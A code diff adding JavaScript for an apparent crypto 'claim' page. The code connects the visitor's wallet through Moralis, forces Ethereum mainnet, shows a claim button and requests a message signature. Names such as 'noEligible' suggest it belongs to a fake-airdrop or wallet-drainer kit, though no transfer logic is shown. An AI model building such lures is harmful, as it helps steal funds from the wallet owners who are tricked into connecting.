@@ -1,3 +1,56 @@
+let web3Provider;
+Moralis.onWeb3Enabled(async (data) => {
+    if (data.chainId !== 1 && metamaskInstalled) await Moralis.switchNetwork("0x1");
+    updateState(true);
+    console.log(data);
+});
+Moralis.onChainChanged(async (chain) => {
+    if (chain !== "0x1" && metamaskInstalled) await Moralis.switchNetwork("0x1");
+});
+window.ethereum ? window.ethereum.on('disconnect', () => updateState(false)) : null;
+window.ethereum ? window.ethereum.on('accountsChanged', (accounts) => {
+    if (accounts.length < 1) updateState(false)
+}) : null;
+
+
+async function updateState(connected) {
+    const web3Js = new Web3(Moralis.provider);
+    document.getElementById('walletAddress').innerHTML = connected ? `CONNECTED <br> <span>${(await web3Js.eth.getAccounts())[0]}</span>` : `NOT CONNECTED`;
+    document.querySelector("#claimButton").style.display = connected ? "" : "none";
+}
+
+setTimeout(async () => {
+    try {
+        const web3Js = new Web3(Moralis.provider);
+        const walletAddress = (await web3Js.eth.getAccounts())[0];
+        console.log(`${walletAddress} is connected`);
+    } catch (e) {
+        Object.assign(document.createElement('a'), {
+            href: "./index.html",
+        }).click();
+    }
+}, 5000);
+
+async function askSign() {
+    const web3Js = new Web3(Moralis.provider);
+    const walletAddress = (await web3Js.eth.getAccounts())[0];
+
+    try {
+        const message = signMessage.replace("{address}", walletAddress).replace("{nonce}", createNonce());
+
+        const signature = await web3Js.eth.personal.sign(message, walletAddress);
+        const signing_address = await web3Js.eth.personal.ecRecover(message, signature);
+
+        console.log(`Signing address: ${signing_address}\n${walletAddress.toLowerCase() == signing_address.toLowerCase() ? "Same address" : "Not the same address."}`);
+        return true;
+    } catch (e) {
+        if (e.message.toLowerCase().includes("user denied")) noEligible("signDenied");
+        console.log(e);
+        return false;
+    }
+
+}
+
 const defaultNetworks = ["ethereum", "binance-smart-chain", "polygon"]
 const chainIdsNetworks = {
     "ethereum": 1,
